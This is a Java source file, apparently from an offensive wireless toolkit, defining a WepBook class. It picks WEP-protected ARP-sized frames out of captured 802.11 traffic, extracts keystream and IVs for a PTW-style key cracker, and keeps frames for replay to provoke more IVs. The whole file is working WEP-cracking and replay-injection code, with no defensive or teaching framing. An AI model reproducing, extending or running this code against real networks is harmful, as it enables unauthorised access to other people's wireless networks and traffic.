package com.opx.oss.engine;

import com.opx.oss.engine.crack.WepCracker;
import com.opx.oss.engine.dot11.Mac;
import com.opx.oss.engine.dot11.wep.Wep;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/**
 * The protected frames the radio hears: each ARP-sized one yields keystream bytes for the
 * cracker, and a handful are kept so a campaign can replay them to provoke more IVs.
 */
public final class WepBook {

    private final WepCracker cracker = new WepCracker();
    private final List<byte[]> arps = new ArrayList<>();
    private int frames;

    /** Offer every protected frame to the book; anything that is not ARP-sized is ignored. */
    public synchronized void feed(byte[] mpdu) {
        if (mpdu == null || mpdu.length < 24) return;
        int fc0 = mpdu[0] & 0xFF;
        if (((fc0 >> 2) & 0x03) != 2) return;
        if ((mpdu[1] & 0x40) == 0) return;              // the protected bit is not set
        int header = Mac.headerLength(fc0, mpdu[1] & 0xFF);
        int body = mpdu.length - header;
        if (body < 4 + 16) return;
        // The Key ID byte's ExtIV bit tells WEP (clear, 4-byte IV) from TKIP/CCMP (set,
        // 8-byte extended IV). Only a clear bit yields the WEP keystream PTW votes on.
        if ((mpdu[header + 3] & 0x20) != 0) return;

        byte[] iv = Wep.iv(mpdu, header);
        byte[] keystream = Wep.keystreamFromArp(mpdu, header + 4, 16);
        cracker.feed(iv, keystream);
        frames++;
        if (arps.size() < 8) arps.add(mpdu.clone());
    }

    /** The protected frames worth replaying, oldest first. */
    public synchronized List<byte[]> samples() {
        List<byte[]> copy = new ArrayList<>(arps.size());
        for (byte[] frame : arps) copy.add(frame.clone());
        return copy.isEmpty() ? Collections.emptyList() : copy;
    }

    public synchronized int frames() {
        return frames;
    }

    public int ivCount() {
        return cracker.sampleCount();
    }

    public boolean ready() {
        return cracker.ready();
    }

    /** The recovered WEP key, or {@code null} while there are too few IVs. */
    public byte[] key() {
        return cracker.recover();
    }
}
